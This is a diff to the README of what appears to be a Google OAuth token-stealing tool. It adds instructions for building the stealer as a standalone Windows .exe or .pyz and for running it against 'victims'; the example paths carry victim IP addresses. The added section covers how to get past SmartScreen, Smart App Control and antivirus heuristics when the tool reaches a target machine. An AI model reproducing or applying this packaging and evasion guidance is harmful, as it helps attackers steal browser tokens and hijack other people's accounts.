@@ -182,10 +182,13 @@ python token_to_session.py victims/PH_112.201.133.55/token_01.txt
 ├── test_token.py                     # Token validation + post-exploitation (any OS)
 ├── token_to_session.py               # Cookie-swap: token -> browser session
 ├── build_pyz.py                      # Reproducible .pyz build (stdlib zipapp)
+├── build_exe.py                      # Reproducible .exe build driver (PyInstaller)
+├── goe.spec                          # PyInstaller recipe -> single-file .exe
 ├── pyz/
-│   └── __main__.py                   # zipapp entry point: extract/test/session dispatcher
-├── dist/
-│   └── google_oauth_extractor.pyz    # Build output (gitignored)
+│   └── __main__.py                   # Shared entry point: extract/test/session dispatcher
+├── dist/                             # Build output (gitignored)
+│   ├── goe.pyz
+│   └── goe.exe
 └── docs/
     ├── TOKEN_EXTRACTION_WINDOWS.md   # Full extraction methodology (live + offline)
     ├── TOKEN_BINDING_REALITY.md      # Token binding myths debunked
@@ -205,7 +208,7 @@ rationale: the target machine already has Python, so no freezer is needed and
 there are zero build dependencies.
 
 ```bash
-python build_pyz.py                    # -> dist/google_oauth_extractor.pyz
+python build_pyz.py                    # -> dist/goe.pyz
 python build_pyz.py --compressed       # smaller archive, slightly slower start
 python build_pyz.py -o out/tool.pyz    # custom output path
 ```
@@ -214,10 +217,10 @@ The archive bundles a single entry point (`pyz/__main__.py`) that dispatches the
 three scripts as subcommands:
 
 ```bash
-py dist/google_oauth_extractor.pyz --help
-py dist/google_oauth_extractor.pyz extract --all-browsers
-py dist/google_oauth_extractor.pyz test victims/PH_112.201.133.55/
-py dist/google_oauth_extractor.pyz session victims/PH_112.201.133.55/token_01.txt
+py dist/goe.pyz --help
+py dist/goe.pyz extract --all-browsers
+py dist/goe.pyz test victims/PH_112.201.133.55/
+py dist/goe.pyz session victims/PH_112.201.133.55/token_01.txt
 ```
 
 - **Standalone usage is unchanged** — `python test_token.py ...` still works.
@@ -227,6 +230,70 @@ py dist/google_oauth_extractor.pyz session victims/PH_112.201.133.55/token_01.tx
   project's source; run `pip install -r requirements.txt` on the target first.
 - **`dist/` and `build/` are gitignored** — commit the recipe
   (`build_pyz.py`, `pyz/__main__.py`), not the artifact.
+
+---
+
+## Building a Standalone Windows Executable (`.exe`)
+
+For a target machine with **no Python at all**, build a single-file executable
+with PyInstaller. This is the Python analogue of a Node `nexe`/`pkg` binary: one
+`.exe` with CPython, the three scripts and every dependency (`requests`,
+`pycryptodome`, `pywin32`) embedded.
+
+```bat
+python -m venv .venv-build
+.venv-build\Scripts\python -m pip install -r requirements.txt pyinstaller
+.venv-build\Scripts\python build_exe.py --clean
+:: -> dist\goe.exe   (~12 MB)
+```
+
+The build recipe lives in the committed **`goe.spec`**, so the
+configuration is reproducible instead of living in shell history. Points worth
+knowing:
+
+- **Single entry point**, shared with the `.pyz`: `pyz/__main__.py`.
+- **`hiddenimports`** lists the three command modules because the dispatcher
+  imports them *dynamically* (`importlib.import_module`) — invisible to static
+  analysis (see [`docs/PACKAGING_PYTHON_CLI.md`](docs/PACKAGING_PYTHON_CLI.md) §1).
+- **`--onefile` self-extracts to `%TEMP%` on every launch.** Prefer faster
+  startup and fewer antivirus false positives? Build `--onedir` instead.
+- **No cross-compiling:** build on Windows to produce a Windows `.exe`.
+- **Signing:** the binary is *unsigned*. Because it is built locally it carries
+  **no Mark-of-the-Web**, so SmartScreen does **not** prompt when you run it on
+  the build machine (`Get-Item goe.exe -Stream *` shows only `:$DATA`). The
+  "Windows protected your PC" prompt is driven by MOTW, so it can appear once the
+  `.exe` reaches another machine by download, email, or a network share. That —
+  not compression — is what Authenticode signing fixes
+  (`docs/PACKAGING_PYTHON_CLI.md` §9). A recipient can clear it with
+  `Unblock-File goe.exe` or Properties → Unblock.
+
+```bat
+dist\goe.exe --help
+dist\goe.exe extract --all-browsers
+```
+
+### `.exe` or `.pyz` — which should you ship?
+
+They answer different questions: the `.exe` removes the *Python* requirement, the
+`.pyz` removes the *trust* problem.
+
+| | `dist\goe.exe` | `dist\goe.pyz` (`py goe.pyz`) |
+|---|---|---|
+| Target has no Python | ✅ works | ❌ needs Python + `pip install -r requirements.txt` |
+| What Windows reputation-checks | **your** unsigned binary | the **signed** `python.exe` |
+| Smart App Control enforced | ❌ blocked (unsigned, no reputation) | ✅ allowed (interpreter is signed/known) |
+| Arrived by download | ⚠️ SmartScreen "unrecognised app" prompt | ⚠️ prompt targets `python.exe`, which has reputation |
+| Antivirus heuristics | higher — bootloader + self-extract to `%TEMP%` | lower — no bootloader, no extraction |
+| Startup | ~1 s (extracts on every launch) | immediate |
+| Hides your code | ❌ (bytecode) | ❌ (plain zip) |
+
+**Rule of thumb:** if the target already has Python, `py goe.pyz` is the
+lower-friction, less-likely-to-be-blocked option — because the only image being
+trust-checked is the signed interpreter, not your artifact. Ship the `.exe` when
+"no Python installed" is the binding constraint. Neither format protects your
+source.
+
+> 📖 Full write-up: [`docs/PACKAGING_PYTHON_CLI.md` §10](docs/PACKAGING_PYTHON_CLI.md#10-windows-trust-motw-smartscreen-and-smart-app-control)
 
 ---
 
